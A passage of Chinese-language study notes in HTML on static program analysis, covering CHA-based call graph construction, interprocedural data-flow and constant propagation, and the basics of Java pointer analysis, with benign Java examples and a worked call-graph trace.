      <p>依据<code>Method Dispatch</code>定义来确定对应方法定义</p>
<ul>
<li><code>c</code>：即<code>class</code>，传入对象的类型</li>
<li><code>m</code>：即函数签名</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230105115219367.png" alt="image-20230105115219367"></p>
<p><code>Dispatch</code>是寻找可以调用的函数，那么可以调用的函数一定是要确保该函数是有具体的函数体的，不能是抽象的<code>non-abstract</code></p>

        <h4 id="例子-3"   >
          <a href="#例子-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子-3" class="headerlink" title="例子"></a>例子</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230105115458209.png" alt="image-20230105115458209"></p>
<ul>
<li><code>Dispatch(B,A.foo())</code>：先从<code>B</code>中找，找不到就找父类，也就是<code>A</code>，从<code>A</code>中获取到<code>foo</code>函数。</li>
<li><code>Dispathc(C,A.foo())</code>：先从<code>C</code>中找，直接找到，那么即为<code>c</code>中的<code>foo</code>函数。</li>
</ul>

        <h2 id="4-Class-Hierarchy-Analysis-CHA"   >
          <a href="#4-Class-Hierarchy-Analysis-CHA" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Class-Hierarchy-Analysis-CHA" class="headerlink" title="4.Class Hierarchy Analysis(CHA)"></a>4.Class Hierarchy Analysis(CHA)</h2>
      <ul>
<li>需要一个类的相关继承结构</li>
<li>求解一个<code>vitural call</code>依据于定义类型和传入的对象</li>
</ul>

        <h3 id="Call-Resolution-of-CHA"   >
          <a href="#Call-Resolution-of-CHA" class="heading-link"><i class="fas fa-link"></i></a><a href="#Call-Resolution-of-CHA" class="headerlink" title="Call Resolution of CHA"></a>Call Resolution of CHA</h3>
      <p>定义方法<code>Resolve(cs)</code>为具体算法分析实例</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230105120933460.png" alt="image-20230105120933460"></p>
<p>其中</p>
<ul>
<li><code>cs</code> : 当前分析的语句</li>
<li><code>m </code> : 函数签名 </li>
<li><code>c^m</code> : <code>m</code>对应的类型</li>
</ul>
<p>具体分析一下</p>

        <h4 id="static-call"   >
          <a href="#static-call" class="heading-link"><i class="fas fa-link"></i></a><a href="#static-call" class="headerlink" title="static call"></a>static call</h4>
      <p>例子如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> T <span class="title">foo</span><span class="params">(P p,Q q)</span></span>&#123;....&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">C.foo(x,y);</span><br></pre></td></tr></table></div></figure>

<p>可得对应变量含义<br>$$<br>\begin{align}<br>&amp;cs : C.foo(x,y); &amp;//当前需要方法解析语句\<br>&amp;m : &lt;C: T\ foo(P,Q)&gt; &amp;//函数签名\<br>\end{align}<br>$$<br>直接返回了对应函数签名的<code>m</code></p>

        <h4 id="speciall-call"   >
          <a href="#speciall-call" class="heading-link"><i class="fas fa-link"></i></a><a href="#speciall-call" class="headerlink" title="speciall call"></a>speciall call</h4>
      
        <h5 id="superclass-instance-methods"   >
          <a href="#superclass-instance-methods" class="heading-link"><i class="fas fa-link"></i></a><a href="#superclass-instance-methods" class="headerlink" title="superclass instance methods"></a>superclass instance methods</h5>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span></span>&#123;</span><br><span class="line">	<span class="function">T <span class="title">foo</span><span class="params">(P p,Q q)</span></span>&#123;</span><br><span class="line">        ...;</span><br><span class="line">        <span class="keyword">super</span>.foo(p,q);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可得对应变量含义<br>$$<br>\begin{align}<br>&amp;cs:super.foo(p,q);\<br>&amp;m:&lt;B: T\ foo(P,Q)&gt;\<br>&amp;c^m:B<br>\end{align}<br>$$<br>由于是<code>super</code>，所以对应对象类型为<code>B</code>。同时需要注意的是这里不能把<code>super</code>直接替换为<code>B</code>，因为可能<code>B</code>中没有定义<code>foo</code>函数，而是在其父类中定义，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230105122718787.png" alt="image-20230105122718787"></p>

        <h5 id="Constructors-Private-instance-mthods"   >
          <a href="#Constructors-Private-instance-mthods" class="heading-link"><i class="fas fa-link"></i></a><a href="#Constructors-Private-instance-mthods" class="headerlink" title="Constructors/Private instance mthods"></a>Constructors/Private instance mthods</h5>
      <p>这两个可以放到一起</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class C extends B&#123;</span><br><span class="line">	<span class="function">T <span class="title">foo</span><span class="params">(P p,Q q)</span></span>&#123;</span><br><span class="line">        ...;</span><br><span class="line">        <span class="keyword">this</span>.bar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> T <span class="title">bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function">C c </span>= <span class="keyword">new</span> C();</span><br></pre></td></tr></table></div></figure>

<p>对应变量含义<br>$$<br>\begin{align}<br>&amp;cs:this.bar();\<br>&amp;m:&lt;C:T\ bar()&gt;\<br>&amp;c^m:C\<br>\<br>&amp;cs:C\ c\ =\ new\ c();\<br>&amp;m:&lt;&gt;<br>\end{align}<br>$$<br>这个可以直接找到，不细说</p>

        <h4 id="vitural-call"   >
          <a href="#vitural-call" class="heading-link"><i class="fas fa-link"></i></a><a href="#vitural-call" class="headerlink" title="vitural call"></a>vitural call</h4>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">	<span class="function">T <span class="title">foo</span><span class="params">(P p,Q q)</span></span>&#123;....&#125;</span><br><span class="line">&#125;</span><br><span class="line">A a = ...;</span><br><span class="line">a.foo(x,y);</span><br></pre></td></tr></table></div></figure>

<p>对应变量含义<br>$$<br>\begin{align}<br>&amp;cs:a.foo(x,y);\<br>&amp;m:&lt;A:\ T\ foo(P,Q)&gt;\<br>&amp;c:A\<br>\end{align}<br>$$<br>其中关于该算法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230106114548955.png" alt="image-20230106114548955"></p>
<p>需要遍历<code>c</code>的所有直接子类以及间接子类，通过<code>Dispatch</code>进行计算，将计算记过放入<code>T</code>中</p>

        <h4 id="实际例子"   >
          <a href="#实际例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#实际例子" class="headerlink" title="实际例子"></a>实际例子</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230106114722837.png" alt="image-20230106114722837"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Resolve(c.foo()) = &#123;C.foo()&#125;</span><br><span class="line">Resolve(a.foo()) = &#123;A.foo(),C.foo(),D.foo()&#125;</span><br><span class="line">Resolve(b.foo()) = &#123;A.foo(),C.foo(),D.foo()&#125;</span><br></pre></td></tr></table></div></figure>

<p>关于<code>Resolve(b.foo())</code>计算结果，前面提到<code>dispatch</code>算法，当在当前类，这里也就是<code>B</code>中没有找到对应函数<code>foo</code>定义，就会去其父类寻找，这里也就是<code>A</code>，所以实际执行进入循环体的类为<code>A</code>，那么其结果就相当于<code>Resovle(a.foo())</code>了。</p>

        <h3 id="Features-of-CHA"   >
          <a href="#Features-of-CHA" class="heading-link"><i class="fas fa-link"></i></a><a href="#Features-of-CHA" class="headerlink" title="Features of CHA"></a>Features of CHA</h3>
      
        <h4 id="Advantage"   >
          <a href="#Advantage" class="heading-link"><i class="fas fa-link"></i></a><a href="#Advantage" class="headerlink" title="Advantage"></a>Advantage</h4>
      <p>很快，只考虑声明类型，然后查找继承树。求解过程中忽略数据流和控制流的相关信息。</p>

        <h4 id="Disadvantage"   >
          <a href="#Disadvantage" class="heading-link"><i class="fas fa-link"></i></a><a href="#Disadvantage" class="headerlink" title="Disadvantage"></a>Disadvantage</h4>
      <p>不准确，因为忽略了数据流和控制流的相关信息</p>

        <h3 id="Algorithm-3"   >
          <a href="#Algorithm-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Algorithm-3" class="headerlink" title="Algorithm"></a>Algorithm</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113100012796.png" alt="image-20230113100012796"></p>
<p>主要是从<code>Work list</code>中取方法后，需要先判断是否已经<code>reachable</code>了，即是否在<code>RM</code>中</p>

        <h4 id="例子-4"   >
          <a href="#例子-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子-4" class="headerlink" title="例子"></a>例子</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113105835279.png" alt="image-20230113105835279"></p>
<ul>
<li><p>首先初始化如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110307953.png" alt="image-20230422110307953"></p>
</li>
<li><p><code>WL=[A.main()],RM=[],CG=[]</code></p>
<ul>
<li><p>从<code>WL</code>取出<code>A.main()</code>，不属于<code>RM</code>，则放入<code>RM</code>，<code>RM=[A.main()]</code></p>
</li>
<li><p><code>A.main</code>的<code>call site</code>为<code>A.foo()</code></p>
</li>
<li><p>求解<code>Resolve(A.foo())</code>，利用之前的提到的<code>Resolve</code>算法，求解得到<code>A.foo()</code>，放入<code>WL</code>中，并且相关边放入<code>CG</code></p>
</li>
<li><p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110340228.png" alt="image-20230422110340228"></p>
</li>
</ul>
</li>
<li><p><code>WL=[A.foo()],RM=[A.main()],CG=[A.main().A.foo()-&gt;A.foo()]</code></p>
<ul>
<li><p><code>RM=[A.main(),A.foo()]</code></p>
</li>
<li><p><code>Resolve(cs of A.foo()) = Resolve(a.bar()) = A.bar()+B.bar()+C.bar()</code>，<code>A.foo().a.bar()-&gt;[A.bar,B.bar,C.bar()]</code>放入<code>CG</code></p>
</li>
<li><p><code>WL=[A.bar(),B.bar(),C.bar()]</code></p>
</li>
<li><p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110408853.png" alt="image-20230422110408853"></p>
</li>
</ul>
</li>
<li><p><code>WL=[A.bar(),B.bar(),C.bar()],RM=[A.main(),A.foo()],CG=[A.main().A.foo()-&gt;A.foo(),A.foo().a.bar()-&gt;&#123;A.bar(),B.bar(),C.bar()&#125;]</code></p>
<ul>
<li><p><code>RM=[A.main(),A.foo(),A.bar()]</code></p>
</li>
<li><p><code>Resolve(cs of A.bar()) = Resolve(c.bar()) = C.bar()</code>，<code>A.bar().c.bar()-&gt;C.bar()</code>放入<code>CG</code></p>
</li>
<li><p><code>WL=[B.bar(),C.bar(),C.bar()]</code></p>
</li>
<li><p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110521314.png" alt="image-20230422110521314"></p>
</li>
</ul>
</li>
<li><p><code>WL=[B.bar(),C.bar(),C.bar()],RM=[A.main(),A.foo(),A.bar()],CG=[A.main().A.foo()-&gt;A.foo(),A.foo().a.bar()-&gt;&#123;A.bar(),B.bar(),C.bar()&#125;,A.bar().c.bar()-&gt;C.bar()]</code></p>
<ul>
<li><p><code>RM=[A.main(),A.foo(),A.bar(),B.bar()]</code></p>
</li>
<li><p><code>Resolve(cs of B.bar()) = Resolve() = []</code></p>
</li>
<li><p><code>WL=[C.bar,C.bar()]</code></p>
</li>
<li><p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110536692.png" alt="image-20230422110536692"></p>
</li>
</ul>
</li>
<li><p><code>WL=[C.bar(),C.bar()],RM=[A.main(),A.foo(),A.bar(),B.bar()],CG=[...]</code></p>
<ul>
<li><p><code>RM=[A.main(),A.foo(),A.bar(),B.bar(),C.bar()]</code></p>
</li>
<li><p><code>Resolve(cs of C.bar()) = Resolve(A.foo()) = A.foo()</code>，<code>C.bar().A.foo()-&gt;A.foo()</code>放入<code>CG</code></p>
</li>
<li><p><code>WL=[C.bar().A.foo()]</code></p>
</li>
<li><p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110659618.png" alt="image-20230422110659618"></p>
</li>
</ul>
</li>
<li><p><code>WL=[C.bar(),A.foo()],RM=[A.main(),A.foo(),A.bar(),B.bar(),C.bar()],CG=[A.main().A.foo()-&gt;A.foo(),A.foo().a.bar()-&gt;&#123;A.bar(),B.bar(),C.bar()&#125;,A.bar().c.bar()-&gt;C.bar(),C.bar().A.foo()-&gt;A.foo()]</code></p>
<ul>
<li><p><code>C.bar()</code>在<code>RM</code>中，跳过，从<code>WL</code>中移除<code>C.bar()</code></p>
</li>
<li><p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110742581.png" alt="image-20230422110742581"></p>
</li>
</ul>
</li>
<li><p><code>WL=[A.foo()],RM=[A.main(),A.foo(),A.bar(),B.bar(),C.bar()],CG=[...]</code></p>
<ul>
<li><p><code>A.foo()</code>在<code>RM</code>中，跳过，从<code>WL</code>中移除<code>A.foo()</code></p>
</li>
<li><p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110813614.png" alt="image-20230422110813614"></p>
</li>
</ul>
</li>
<li><p><code>WL=[],RM=[A.main(),A.foo(),A.bar(),B.bar(),C.bar()],CG=[...]</code></p>
<ul>
<li><p><code>WL</code>为空，算法结束。</p>
</li>
<li><p>最终结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230422110813614.png"></p>
</li>
</ul>
</li>
</ul>
<p>其中<code>CG</code>的表达形式不知道怎么写合适，就只能大概写一下</p>

        <h2 id="5-Interprocedural-Control-Flow-Graph"   >
          <a href="#5-Interprocedural-Control-Flow-Graph" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-Interprocedural-Control-Flow-Graph" class="headerlink" title="5.Interprocedural Control-Flow Graph"></a>5.Interprocedural Control-Flow Graph</h2>
      <ul>
<li>CGF：展示的是方法之间的调用关系</li>
<li>ICFG：展示的是整个程序的调用关系<ul>
<li><code>ICFG = CFGs + call&amp;return edges</code><ul>
<li><code>call edges</code> : 即调用边，<code>call site</code>到对应函数入口点</li>
<li><code>return edges</code> : 即函数返回点到该函数的被调用点</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113113450334.png" alt="image-20230113113450334"></p>

        <h2 id="6-Interprocedural-Data-Flow-Analysis"   >
          <a href="#6-Interprocedural-Data-Flow-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-Interprocedural-Data-Flow-Analysis" class="headerlink" title="6.Interprocedural Data-Flow Analysis"></a>6.Interprocedural Data-Flow Analysis</h2>
      <p>其实相对于<code>Intraprocedural Data-Flow Analysis</code>，会多<code>call transfer function</code>和<code>return transfer function</code>。即数据进入函数前的转化函数以及回来的时候的转化函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113110940851.png" alt="image-20230113110940851"></p>

        <h3 id="Interprocedural-Constant-Propagation"   >
          <a href="#Interprocedural-Constant-Propagation" class="heading-link"><i class="fas fa-link"></i></a><a href="#Interprocedural-Constant-Propagation" class="headerlink" title="Interprocedural Constant Propagation"></a>Interprocedural Constant Propagation</h3>
      <p>主要是<code>Node transfer</code>，即如下情况，即为一个<code>Node transfer</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113112521557.png" alt="image-20230113112521557"></p>

        <h4 id="实例"   >
          <a href="#实例" class="heading-link"><i class="fas fa-link"></i></a><a href="#实例" class="headerlink" title="实例"></a>实例</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113112947040.png" alt="image-20230113112947040"></p>
<p>其中打问号的边叫做<code>call-to-return edge</code>，是用来传递本函数变量的，即该函数内部的变量，即这里的<code>a</code>，如果没有的话，就会导致本函数变量的传播经过调用函数绕一大圈才能回来。如下所示，本函数变量<code>a</code>就需要经过<code>addOne</code>传播才能回来，很影响效率。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113113112058.png" alt="image-20230113113112058"></p>
<p>注意在传播过程的<code>Node transfer</code>时，需要<code>kill</code>掉返回覆盖的变量，比如这里就是<code>b</code>，这样在后面<code>call-to-return edge</code>和<code>return edge</code>进行<code>join</code>操作才会正确，如果不<code>kill</code>掉，就容易出现如下结果</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113113906445.png" alt="image-20230113113906445"></p>
<p>没有<code>kill</code>掉时，即从<code>b=ten()</code>这条<code>call-to-return edge</code>流下来的<code>b</code>为7，而从<code>return edge</code>流出来的<code>b</code>为10，依据之前常量传播的<code>Control Flow</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IN[B] = ⊓p predecessor of B OUT[p]</span><br></pre></td></tr></table></div></figure>

<p>就会导致<code>b</code>的值为<code>NAC</code>，这是不准确的，其结果应该是被覆盖的那个值。</p>

        <h4 id="类比Intraprocedural-Constant-Propagation"   >
          <a href="#类比Intraprocedural-Constant-Propagation" class="heading-link"><i class="fas fa-link"></i></a><a href="#类比Intraprocedural-Constant-Propagation" class="headerlink" title="类比Intraprocedural Constant Propagation"></a>类比Intraprocedural Constant Propagation</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113124541680.png" alt="image-20230113124541680"></p>
<p>碰到函数调用就会产生<code>NAC</code>，不准确</p>

        <h2 id="总结"   >
          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113124706083.png" alt="image-20230113124706083"></p>
<p>怎么通过类继承关系来创建调用图、过程间的控制流以及数据流分析的相关概念、过程间的常量分析</p>

        <h1 id="七、Pointer-Analysis"   >
          <a href="#七、Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、Pointer-Analysis" class="headerlink" title="七、Pointer Analysis"></a>七、Pointer Analysis</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114105324445.png" alt="image-20230114105324445"></p>

        <h2 id="1-Motivation-1"   >
          <a href="#1-Motivation-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Motivation-1" class="headerlink" title="1.Motivation"></a>1.Motivation</h2>
      <p>在常规的<code>CHA</code>方法中，由于一个方法调用可能指向多个方法，那么在遍历这些方法的时候，返回的值都有可能不同，然后再做<code>join</code>操作时，就有可能出问题。</p>
<p>比如如下的<code>Constant Propagation </code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113144912366.png" alt="image-20230113144912366"></p>
<p>由于声明的类型为<code>Number</code>，调用<code>get</code>时有三个子类，那么就会有三个方法需要进行遍历，最后进行<code>join</code>时就会导致<code>X=NAC</code>。但是实际上，其实只会调用到<code>One.get()</code>方法，只会返回1，导致<code>CHA</code>不准确，那么就用到<code>Pointer analysis</code>，更加准确</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113145316011.png" alt="image-20230113145316011"></p>

        <h2 id="2-Introduction-to-Pointer-Analysis"   >
          <a href="#2-Introduction-to-Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Introduction-to-Pointer-Analysis" class="headerlink" title="2.Introduction to Pointer Analysis"></a>2.Introduction to Pointer Analysis</h2>
      <p>指针分析是属于<code>may-analysis</code>，有很多年历史，包括现今指针分析还有很多问题没有被完善解决，所以还是有很多这方面的研究应用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113145957855.png" alt="image-20230113145957855"></p>

        <h3 id="例子-5"   >
          <a href="#例子-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#例子-5" class="headerlink" title="例子"></a>例子</h3>
      <p>相关的一些表达方式如下，指针分析即一个程序作为输入，通过分析之后，得到一个指向关系表。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113150547144.png" alt="image-20230113150547144"></p>

        <h3 id="应用"   >
          <a href="#应用" class="heading-link"><i class="fas fa-link"></i></a><a href="#应用" class="headerlink" title="应用"></a>应用</h3>
      <p>应用很多，特别基础</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113150838229.png" alt="image-20230113150838229"></p>

        <h2 id="3-Key-Factors-of-Pointer-Analysis"   >
          <a href="#3-Key-Factors-of-Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Key-Factors-of-Pointer-Analysis" class="headerlink" title="3.Key Factors of Pointer Analysis"></a>3.Key Factors of Pointer Analysis</h2>
      <p>指针分析中主要的一些讨论点，问题以及相关的处理方法，这些处理方法都有各自的优缺点，主要关注于分析的准确度<code>precision</code>以及效率<code>efficiency</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113151258381.png" alt="image-20230113151258381"></p>

        <h3 id="Heap-Abstraction"   >
          <a href="#Heap-Abstraction" class="heading-link"><i class="fas fa-link"></i></a><a href="#Heap-Abstraction" class="headerlink" title="Heap Abstraction"></a>Heap Abstraction</h3>
      <p>堆内存相信大家都很熟悉了，而在静态分析里面，由于堆是动态创建的，程序没有跑起来之前，不好确定程序究竟创建了多少个对象，而在有循环或者递归什么的时候，就更多了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113152342466.png" alt="image-20230113152342466"></p>
<p>那么为了在静态分析中，确保分析过程能够停止下来，就不能在分析过程创建<code>infinite</code>个对象，就需要一种技术来对它进行抽象限制。</p>
<p>比较直观的一个例子就是把多个相同的对象都抽象成一个对象，如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113152349767.png" alt="image-20230113152349767"></p>
<p>相关的抽象技术也是很复杂，很多</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113152414219.png" alt="image-20230113152414219"></p>

        <h4 id="Allocation-Site-Abstraction"   >
          <a href="#Allocation-Site-Abstraction" class="heading-link"><i class="fas fa-link"></i></a><a href="#Allocation-Site-Abstraction" class="headerlink" title="Allocation-Site Abstraction"></a>Allocation-Site Abstraction</h4>
      <p>这个就是<code>Heap Abstraction</code>中一种技术，<code>Allocation-Site Abstraction</code>创建的抽象技术</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113152536353.png" alt="image-20230113152536353"></p>
<p>比如这里的<code>O2</code>是代表程序中第二行创建对象语句，实际上由于循环有三次，所以会创建三个对象，但是基于<code>Alloction-Site Abstraction</code>，可以将这三个对象都抽象成一个对象<code>O2</code>。</p>
<p>由于一个程序中对象创建点肯定是有限的，那么抽象对象也肯定会是有限的，能够<code>terminate</code>。</p>

        <h3 id="Context-sentivity"   >
          <a href="#Context-sentivity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Context-sentivity" class="headerlink" title="Context sentivity"></a>Context sentivity</h3>
      <p>一个方法被调用时依据传进来的参数不同，肯定也会对应不同的输出，所以针对同一个方法分析时，上下文敏感<code>Context sentivity</code>和上下文不敏感<code>Context insensitive</code>就是两种分析方法了，如下感觉图解很清楚。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113153450361.png" alt="image-20230113153450361"></p>
<p>会从<code>Context Insentivity</code>开始学习。对<code>JAVA</code>语言来说，<code>Context sentivity</code>提升是很明显的。</p>

        <h3 id="Flow-Insentivity"   >
          <a href="#Flow-Insentivity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Flow-Insentivity" class="headerlink" title="Flow Insentivity"></a>Flow Insentivity</h3>
      <p>之前学习的基本都是<code>Flow Sentivity</code>，即会依照程序的执行顺序，一步一步进行分析。但是<code>Flow Insentivity</code>则不会，它相当于将之揉杂在一起，不管程序的执行顺序。相关例子如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113155136287.png" alt="image-20230113155136287"></p>
<ul>
<li><code>Flow Sentivity</code> : 每一条语句的指向关系<code>map</code>都会随着该语句的执行做出相应的改变，开销比较大，每一点都需要进行维护，速度会慢很多。</li>
<li><code>Flow Insentivity</code> : 相当于把一个变量的所有可能的指向关系<code>map</code>都会全部列出来，不管语句的相关执行顺序，会导致一些精度的缺失。</li>
</ul>
<p>对于<code>Java</code>而言，现今还没有相关的研究明显证明<code>Flow sentivity</code>比<code>Flow Insentivity</code>精度更好，所以现今大多都是针对<code>JAVA</code>的分析都是基于<code>Flow Insentivity</code> ，因为更简单更快。</p>
<p>但是对于<code>C</code>语言而言，<code>Flow sentivity</code>是会更好的。</p>

        <h3 id="Analysis-Scope"   >
          <a href="#Analysis-Scope" class="heading-link"><i class="fas fa-link"></i></a><a href="#Analysis-Scope" class="headerlink" title="Analysis Scope"></a>Analysis Scope</h3>
      <p>分析的范围，通常是两种，即<code>Whole-Program</code>全程序和<code>Demand-driven</code>需求驱动</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230113160401076.png" alt="image-20230113160401076"></p>
<ul>
<li><code>Whole-Program</code> : 即整个程序所有变量的指向关系都会分析出来。更加简单全面，比较主流。</li>
<li><code>Demand-driven</code> : 即需要哪一部分就分析哪一部分，这里就好比需要分析<code>z.bar()</code>，那就只需要<code>z</code>的指向关系了。相比<code>Whole-Program</code>，有时候其效率其实也差不多，所以大多选择<code>Whole-Program</code>。</li>
</ul>

        <h2 id="4-Pointers-in-Java"   >
          <a href="#4-Pointers-in-Java" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Pointers-in-Java" class="headerlink" title="4.Pointers in Java"></a>4.Pointers in Java</h2>
      
        <h3 id="关注的指针类型"   >
          <a href="#关注的指针类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#关注的指针类型" class="headerlink" title="关注的指针类型"></a>关注的指针类型</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114103432918.png" alt="image-20230114103432918"></p>
<p>基本只关注其中两种指针，即<code>local variable</code>，这个其实和<code>Static field</code>差不多。</p>
<p>另一个就是<code>Instance field</code>即类中的成员属性指针，这个和<code>Array element</code>基本归为一类，但是在处理的时候需要对<code>Array element</code>一些抽象，不关注其中的索引，而只关注其保存的指针，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114103639748.png" alt="image-20230114103639748"></p>
<p>将索引抽象成一个，因为在实际的程序中，索引很难判断出来，尤其在循环中，索引大多都是一些变量什么的，所以不好进行判断，那么就抽象成一个就好了。</p>

        <h3 id="关注的指针语句"   >
          <a href="#关注的指针语句" class="heading-link"><i class="fas fa-link"></i></a><a href="#关注的指针语句" class="headerlink" title="关注的指针语句"></a>关注的指针语句</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114104116410.png" alt="image-20230114104116410"></p>
<p>有两个需要特殊说明一下</p>
<ul>
<li><p><code>Store</code> : 有时候可能会有很复杂的语句，比如<code>x.f.g.h = y </code>，但是将之转换为三地址码，就比较简便了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114104311457.png" alt="image-20230114104311457"></p>
</li>
<li><p><code>Call</code> : <code>JAVA</code>中存在三种类型的<code>Call</code>，但是我们关注于处理<code>Vitural call</code>的情况，这个比较复杂，这个会处理其他也会处理了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114104435917.png" alt="aaa"></p>
</li>
</ul>

        <h2 id="总结-1"   >
          <a href="#总结-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114104551016.png" alt="image-20230114104551016"></p>
<p>理解指针分析，影响指针分析的几种要素，以及在分析过程中需要处理分析的对象。</p>

        <h1 id="八、Pointer-Analysis-Foundations-I"   >
          <a href="#八、Pointer-Analysis-Foundations-I" class="heading-link"><i class="fas fa-link"></i></a><a href="#八、Pointer-Analysis-Foundations-I" class="headerlink" title="八、Pointer Analysis Foundations (I)"></a>八、Pointer Analysis Foundations (I)</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230114105245754.png" alt="image-20230114105245754"></p>

        <h2 id="相关概念定义"   >
